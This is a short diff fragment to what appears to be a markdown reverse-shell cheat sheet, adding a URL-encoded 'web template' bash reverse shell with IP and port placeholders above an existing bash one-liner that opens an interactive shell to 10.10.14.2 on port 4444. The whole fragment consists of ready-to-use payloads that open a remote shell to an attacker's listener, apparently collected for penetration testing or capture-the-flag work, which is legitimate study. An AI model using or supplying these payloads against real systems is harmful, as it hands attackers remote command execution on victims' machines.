@@ -31,6 +31,11 @@
 
 ## Bash Reverse Shells
 
+### Web template
+```bash
+bash+-c+'bash+-i+>%26+/dev/tcp/<IP>/<PORT>+0>%261'
+```
+
 ### Standard Bash
 ```bash
 bash -i >& /dev/tcp/10.10.14.2/4444 0>&1
